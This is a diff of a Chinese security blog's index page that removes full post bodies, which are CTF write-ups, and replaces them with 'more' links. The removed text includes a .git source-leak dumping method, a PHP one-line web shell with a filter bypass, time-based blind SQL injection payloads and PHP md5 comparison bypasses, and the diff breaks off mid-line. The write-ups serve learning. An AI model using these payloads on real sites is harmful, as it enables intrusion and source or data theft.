@@ -205,48 +205,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <!--我今天要写一篇博客，学习一个知识，不然对不起我刚刚架势十足的从实验室出去把门口排练小品的人赶走，原本出去玩了一天回来很累的我趴在实验室小憩，结果出去让他们学长过来后我说“你们换个地方练吧，我们都在学习呢”，回来不好意思睡觉了......毕竟我也是在学习呢......-->
-<h1 id="Git的简介"><a href="#Git的简介" class="headerlink" title="Git的简介"></a>Git的简介</h1><p>Git是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。是为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p>
-<p>Git具有以下特点：</p>
-<ol>
-<li>开发者可以提交到本地，每个开发者通过克隆（git clone），在本地机器上拷贝一个完整的Git仓库。（也是分布式相比于集中式的最大区别）</li>
-<li>公共服务器压力和数据量都不会太大。</li>
-<li>速度快、灵活。</li>
-<li>任意两个开发者之间可以很容易的解决冲突。</li>
-<li>离线工作。</li>
-<li>代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。</li>
-</ol>
-<h1 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h1><p>一些开发人员在开发时为了让版本控制和网站部署变得方便，会先将仓库托管在Coding或者Github上，开发好后，直接将源码打包上传进行解压。</p>
-<p>可是由于在目录中初始化一个仓库后，会在这个目录下产生一个名叫.git的文件夹，这个文件夹里保存了这个仓库的所有版本信息。如果开发者没有将这个文件夹删除，则会造成源码泄露，攻击者可以利用这个文件还原重建工程代码，进一步进行代码审计，挖掘文件上传、sql注入等漏洞。</p>
-<p>同时，如果网站涉及到数据库操作，则可能导致链接数据库需要的用户名、密码、端口、库名等信息从源码中泄露，一旦服务器开放了数据库的远程连接功能，攻击者就可以使用从源码中得到的用户名密码进行登录，造成更多安全隐患。</p>
-<blockquote>
-<p>附：<a href="https://note.youdao.com/" target="_blank" rel="noopener">.git文件夹详解</a>及git仓库下两个文件</p>
-<ol>
-<li>README.md ：对code source的介绍，相当于注释作用，通常涵盖项目介绍、代码所实现的功能、系统环境参数、部署要素、代码组织架构等内容</li>
-<li>.gitignore ：配置 git 需要忽略的文件或文件夹，从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志/配置文件等敏感文件</li>
-</ol>
-</blockquote>
-<h1 id="git漏洞的利用"><a href="#git漏洞的利用" class="headerlink" title="git漏洞的利用"></a>git漏洞的利用</h1><h2 id="使用GitHack工具"><a href="#使用GitHack工具" class="headerlink" title="使用GitHack工具"></a>使用GitHack工具</h2><p>下载地址 <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
-<p>GitHack是一个.git泄露利用脚本，只需要下载到本地，cd到所在文件夹，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python githack.py http://xxx.x.x.x/.git</span><br></pre></td></tr></table></figure></p>
-<p> 命令</p>
-<p> 这里我们用Jarvis oj的一道题做演示，题目地址<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a><br> <img src="https://s2.ax1x.com/2019/11/04/KxOSTx.png" alt="1"><br> 运行结束后得到文件<br> <img src="https://s2.ax1x.com/2019/11/04/KxLz01.png" alt="2"></p>
-<h2 id="爬虫爬取整个git目录"><a href="#爬虫爬取整个git目录" class="headerlink" title="爬虫爬取整个git目录"></a>爬虫爬取整个git目录</h2><p>这种方法跟使用githack工具相比，好处在于可以完全模拟服务器上的代码环境，跟踪到git的每一次提交，得到git提交日志中可能存在的开发人员对每一次commit的描述，例如对某个bug的修复，进而进行白盒审计。</p>
-<h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><ol>
-<li>在linux下利用wget对该目录进行递归下载</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -r -p -np -k http://www.xxx.com/.git/</span><br><span class="line">--recursive（递归）</span><br><span class="line">-k,  --convert-links（转换链接）</span><br><span class="line">-p,  --page-requisites（页面必需元素）</span><br><span class="line">-np, --no-parent（不追溯至父级）</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>下载完成后，进入下载的目录<br>3.执行命令git log，查看网站的提交记录<br>4.执行命令gir reset –hard [log hash]，恢复到指定版本号，只需要源码的话就恢复到最近一次的提交</li>
-</ol>
-<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><ol>
-<li>对.git目录的访问权限进行控制</li>
-<li>在每次pull之后删除.git文件夹</li>
-</ol>
-<hr>
-<p>参考链接：<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">https://www.jianshu.com/p/edae09535ea3</a></p>
-<!--在文章开始之前我说我今天要写一篇博客，没想到这已经是第三天了。。我得反省一下自己怎么那么不把学习当回事了!-->
+        <p>git源码泄露<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -269,6 +230,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/11/04/git源码泄露/#more">more >></a>
+        </p>
       
     
   </div>
@@ -311,31 +276,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h1><p>打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马<br><img src="https://s2.ax1x.com/2019/10/24/Kae5id.png" alt="1"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一句话木马：</span><br><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>再次上传，得到提示不能有”&lt;?”<br><img src="https://s2.ax1x.com/2019/10/24/KamMy6.png" alt="2"><br>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">@eval($_POST[&apos;mc&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>绕过&lt;?的限制，再次上传，上传成功，并得到上传后的文件名。</p>
-<p>接着利用御剑进行爆破扫描，得到几个可利用的目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./uploads/</span><br><span class="line">./include.php</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>在./uploads/里找到了自己上传的图片<br><img src="https://s2.ax1x.com/2019/10/24/KaZqUJ.png" alt="3"><br>连接菜刀期待得到flag</p>
-<p>然后，连不上。。。</p>
-<p>在题目放了提示二次渲染之后，学习了一波关于二次渲染的知识，（在这里分享一波我们 温柔的！yang学长 的文章<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a> 太详细啦）<br>大致的看了关于二次渲染的知识后就开始尝试绕过，由于我的脑回路新奇吧加上没好好看学长这篇文章，我选择了上传jpg格式的图片[手动微笑]，然后就开始了漫长的生成jpg图片马的过程，以及为了生成它漫长的安装php gd库的过程[再次微笑]</p>
-<p>png和jpg格式的文件绕过二次渲染比较麻烦，其实我们可以选择上传gif，只需要下载上传后的文件跟下载前的文件进行比对，找到渲染前后没有变化的位置,然后将php代码写进去即可成功绕过</p>
-<p>然后绕过之后，依然连不上菜刀hhhhhh</p>
-<p>but代码执行不了可以构造命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>post传参访问图片的包含路径（刚刚扫描到的路径./include.php）<br><img src="https://s2.ax1x.com/2019/10/24/Kam7tJ.png" alt="4"><br>看到一个，名为flag的文件，cat这个文件，得到flag<br><img src="https://s2.ax1x.com/2019/10/24/KaZ7bF.png" alt="5"></p>
-<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>一道关于时间的盲注，过滤掉了一些字符<br><img src="https://s2.ax1x.com/2019/10/24/KamykQ.png" alt="6"><br>第一步爆数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from (( select sleep(ascii(mid(database() from (1) for (1))) &gt;119))A join (select 2)B join (select 6)C) #</span><br><span class="line"></span><br><span class="line">一个字母一个字母的爆.....是不是有点菜了，得到数据库&quot;web&quot;</span><br></pre></td></tr></table></figure>
-<p>第二步爆表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from (( select sleep(((ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema regexp database()) from (1) for (1)))) &lt; 97)/(1/5)))A join (select 2)B join (select 3)C) #</span><br><span class="line"></span><br><span class="line">表名article</span><br></pre></td></tr></table></figure>
-<p>第三步爆字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from (( select sleep(((ascii(mid((select group_concat(column_name) from information_schema.columns where table_name regexp &apos;article&apos;) from (1) for (1)))) &lt; 105)/(1/5)))A join (select 2)B join (select 3)C) #</span><br><span class="line"></span><br><span class="line">得到id,username,flag...</span><br></pre></td></tr></table></figure>
-<p>第四步爆flag字段的数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from (( select sleep(((ascii(mid((select flag from article) from (1) for (1)))) &lt;102)/(1/5)))A join (select 2)B join (select 3)C) #</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-
+        <p>zk十月赛<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -358,6 +301,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/10/24/zk十月赛/#more">more >></a>
+        </p>
       
     
   </div>
@@ -400,39 +347,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <!--又快一个月没更新博客了，放弃就是很容易。看了看新手2的博客，结尾是溜冰取得了很大进步？？今天上轮滑课我都要哭出来，我太害怕了，上周的课我摔了一跤，可能是把我摔怕了，我太胆小了，又想着放弃了.我想到了那段话：你15岁觉得游泳难，你放弃游泳，18岁遇见一个喜欢的人，约你去游泳，你只好说“我不会耶”，18岁时觉得英文难，放弃学英文，28岁出现一个很棒的工作机会，要求英语流利，你只好说“我不会耶”，人生前期越嫌麻烦，越懒得学，后来就越是会错过让你心动的人与事，错过风景。-->
-<h1 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件：</span><br><span class="line">JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow==</span><br></pre></td></tr></table></figure>
-<p>打开文件发现是base64，使用在线解密工具<a href="http://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">http://tool.oschina.net/encrypt?type=3</a> 得到unicode编码，再使用在线解密工具<a href="http://tool.oschina.net/encode" target="_blank" rel="noopener">http://tool.oschina.net/encode</a> 又得到base64编码，再解密一次，得到ascll码，转换之后得到flag</p>
-<h1 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h1><p>题目给的文件为.pyc文件，先将其反编译成.py文件。反编译可以下载uncompyle6工具或者使用在线反编译工具<a href="https://tool.lu/pyc/得到.py文件如下：" target="_blank" rel="noopener">https://tool.lu/pyc/得到.py文件如下：</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode1(ans):</span><br><span class="line">    s = &apos;&apos;</span><br><span class="line">    for i in ans:</span><br><span class="line">        x = ord(i) ^ 36</span><br><span class="line">        x = x + 25</span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode2(ans):</span><br><span class="line">    s = &apos;&apos;</span><br><span class="line">    for i in ans:</span><br><span class="line">        x = ord(i) + 36</span><br><span class="line">        x = x ^ 36</span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode3(ans):</span><br><span class="line">    return base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line">flag = &apos; &apos;</span><br><span class="line">print &apos;Please Input your flag:&apos;</span><br><span class="line">flag = raw_input()</span><br><span class="line">final = &apos;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&apos;</span><br><span class="line">if encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print &apos;correct&apos;</span><br><span class="line">else:</span><br><span class="line">    print &apos;wrong&apos;</span><br></pre></td></tr></table></figure>
-<p>根据代码，写出解密脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = &apos;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&apos;</span><br><span class="line">b = base64.b32decode(a)</span><br><span class="line"></span><br><span class="line">s = &apos;&apos;</span><br><span class="line">for i in b:</span><br><span class="line">    s += chr((ord(i) ^ 36) - 36)</span><br><span class="line">l = &apos;&apos;</span><br><span class="line">for i in s:</span><br><span class="line">    l += chr((ord(i) - 25) ^ 36)</span><br><span class="line">print (&apos;flag is &apos;,l)</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<hr>
-<p>因为之前没有学习过python，所以从最基础的记录下</p>
-<ul>
-<li style="list-style: none"><input type="checkbox"> Python不用推荐用分号，而是用回车</li>
-<li style="list-style: none"><input type="checkbox"> def：相当于define，用来定义函数</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 例：简单的函数使用</span><br><span class="line"># 定义函数</span><br><span class="line">def hello():</span><br><span class="line">    print &apos;hello python!&apos;</span><br><span class="line">     </span><br><span class="line"># 调用函数        </span><br><span class="line">hello()</span><br></pre></td></tr></table></figure>
-<ul>
-<li style="list-style: none"><input type="checkbox"> for in循环：是一种循环结构，常用于遍历可迭代的对象</li>
-<li style="list-style: none"><input type="checkbox"> 在python中，for…else中的else语句会在循环正常执行完（即for不是通过break跳出而中断的）的情况下执行一次，while … else也是一样。</li>
-<li style="list-style: none"><input type="checkbox"> ord()函数：接受一个参数，返回值是int整数，返回其对应的ASCII</li>
-<li style="list-style: none"><input type="checkbox"> chr()函数：返回当前整数对应的 ASCII 字符，范围在range(256)内，参数可以是可以是10进制也可以是16进制的形式的数字</li>
-<li style="list-style: none"><input type="checkbox"> base64.b32encode(s)：使用Base32编码字符串。s是要编码的字符串。</li>
-</ul>
-<h1 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件：</span><br><span class="line">8842101220480224404014224202480122</span><br></pre></td></tr></table></figure>
-<p>百度搜到的二进制幂数加密：<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86%E6%B3%95/2410151?fr=aladdin" target="_blank" rel="noopener">链接</a></p>
-<p>而本题不是二进制的幂数加密，而是01248密码，又称云影密码，<a href="http://www.tuili.com/blog/u/503/archives/2009/1200.html" target="_blank" rel="noopener">关于01248密码的链接</a></p>
-<p>这种密码由0,1,2,4,8这几个数组成，但是以加法的形式可以得到0~9的各个数字，比如28=0,14=5,124=7，再用得到的数1-26表示字母的A-Z，0来作为分隔。</p>
-<p>本题中密文：8842101220480224404014224202480122</p>
-<p>8+8+4+2+1=23=W，依次类推就可以得到明文WELLDONE，从而得到flag</p>
-<hr>
-<p>附上一个工具链接 ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg</p>
-
+        <p>crypto<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -455,6 +372,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/10/17/攻防世界crypto新手wp（3）/#more">more >></a>
+        </p>
       
     
   </div>
@@ -497,39 +418,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这次web题考察的第一个知识点是robots协议，打开题目链接后只看到一个图片，在地址栏输入robots.txt，得到一个写着index.php.bak的界面，以.bak为后缀的都是备份文件，下载这个文件可以得到源代码，接下来开始对源码进行分析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$v1=$v2=$v3=0;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag=&apos;flag&#123;******&#125;&apos;;</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$m=@(string)$_GET[&apos;m&apos;];</span><br><span class="line">$n=@(string)$_GET[&apos;n&apos;];</span><br><span class="line">$a=@(string)$_POST[&apos;a&apos;];</span><br><span class="line">$b=@(string)$_POST[&apos;b&apos;];</span><br><span class="line">$c=@(string)$_POST[&apos;c&apos;];</span><br><span class="line">if(isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">	$num = intval($_GET[&apos;num&apos;]);</span><br><span class="line">	if ($num==2333 &amp;&amp; $_GET[&apos;num&apos;]!=2333 &amp;&amp; $_GET[&apos;num&apos;]!=iconv(&quot;UTF-8&quot;,&quot;gbk//IGNORE&quot;,$_GET[&apos;num&apos;])) &#123;</span><br><span class="line">		$v1=1;</span><br><span class="line">		if ($v1 &amp;&amp; $m!=$n &amp;&amp; md5($m)==md5($n) )&#123;</span><br><span class="line">			$v2=1;</span><br><span class="line">			if($v2 &amp;&amp; !( $a == $b || $a == $c || $b == $c )&amp;&amp; !(md5($a) !== md5($b) || md5($b) !== md5($c) || md5($a) !== md5($c)))&#123;</span><br><span class="line">				$v3=1;</span><br><span class="line">				if($v3)&#123;</span><br><span class="line">					echo &quot;$flag&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;/h1&gt;&lt;img src=&apos;want.jpg&apos;/&gt;&lt;/center&gt;&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			die(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;/h1&gt;&lt;img src=&apos;want.jpg&apos;/&gt;&lt;/center&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		die(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;/h1&gt;&lt;img src=&apos;want.jpg&apos;/&gt;&lt;/center&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	die(&quot;&lt;center&gt;&lt;h1&gt;Do you want flag?&lt;/h1&gt;&lt;img src=&apos;want.jpg&apos;/&gt;&lt;/center&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>首先观察到每一层的错误提示都是一样的，因此难以判断对错，所以把源码复制到本地改一下错误提示后开始绕过。<br>第一层：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($num==2333 &amp;&amp; $_GET[&apos;num&apos;]!=2333 &amp;&amp; $_GET[&apos;num&apos;]!=iconv(&quot;UTF-8&quot;,&quot;gbk//IGNORE&quot;,$_GET[&apos;num&apos;]))</span><br></pre></td></tr></table></figure>
-<p>要求num的值为2333，但get到的num不为2333，查看源码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num = intval($_GET[&apos;num&apos;]);</span><br></pre></td></tr></table></figure></p>
-<p>num进行了intval处理，会返回变量的整数值，因此可以输入小数来绕过$num==2333 &amp;&amp; $_GET[‘num’]!=2333。<br>iconv函数把抓取来过的utf-8编码的页面转成gbk编码，IGNORE就是说遇到无法转换的就跳过，忽略转换时的错误。因为中文情况下utf-8转换为gbk通常会发生乱码问题，所以可以用中文绕过第三个条件（我觉得是这个原因，我也不知道对不对。。）</p>
-<p>所以构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=2333.3好</span><br></pre></td></tr></table></figure>
-<p>至此绕过第一层if语句，接下来看第二层</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($v1 &amp;&amp; $m!=$n &amp;&amp; md5($m)==md5($n) )</span><br></pre></td></tr></table></figure>
-<p>md5弱比较，在php中以0e开头的会被识别为科学记数法，结果均为0，所以可以构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=s878926199a&amp;n=s155964671a</span><br></pre></td></tr></table></figure></p>
-<p>进行绕过。（结尾附0e开头的md5和原值）</p>
-<p>第三层</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($v2 &amp;&amp; !( $a == $b || $a == $c || $b == $c )&amp;&amp; !(md5($a) !== md5($b) || md5($b) !== md5($c) || md5($a) !== md5($c)))</span><br></pre></td></tr></table></figure>
-<p>md5的强碰撞，此时不能输入数组进行绕过，只能输入字符串，把！转化过来后是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($a !== $b &amp;&amp; $a !== $c &amp;&amp; $b !== $c)&amp;&amp;(md5($a) === md5($b) &amp;&amp; md5($b) === md5($c) &amp;&amp; md5($a) === md5($c))</span><br></pre></td></tr></table></figure>
-<p>这里推荐一篇文章 <a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161#toc-5</a></p>
-<p>下载fastcoll工具“<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">快速 MD5 碰撞生成器</a>”</p>
-<p>【下载地址： <a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a> 】</p>
-<p>本题要求三个MD5相同的文件，而fastcoll工具只能一次性生成两个文件，所以我们需要借助一个工具tail.exe【下载地址：<a href="https://www.trisunsoft.com/tail-for-windows.htm" target="_blank" rel="noopener">https://www.trisunsoft.com/tail-for-windows.htm</a> 】以及windows下的type命令</p>
-<p>（windows下的tail命令，用于查看文件内容，并且可将指定长度内容输出到另一文件，）</p>
-<p>本次过程在windows cmd.exe执行，具体生成过程如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o jlzj0 jlzj1      #-o参数代表随机生成两个相同MD5的文件</span><br><span class="line">D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01  #-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同</span><br><span class="line">D:\fastcoll&gt;tail.exe -c 128 jlzj00 &gt; a                #-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因</span><br><span class="line">D:\fastcoll&gt;type jlzj0 a &gt; jlzj10                    #这里表示将jlzj0和a文件的内容合并写入jlzj10</span><br></pre></td></tr></table></figure>
-<p>到这里已经生成了jlzj00,jlzj01,jlzj10三个MD5相同的文件</p>
-<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 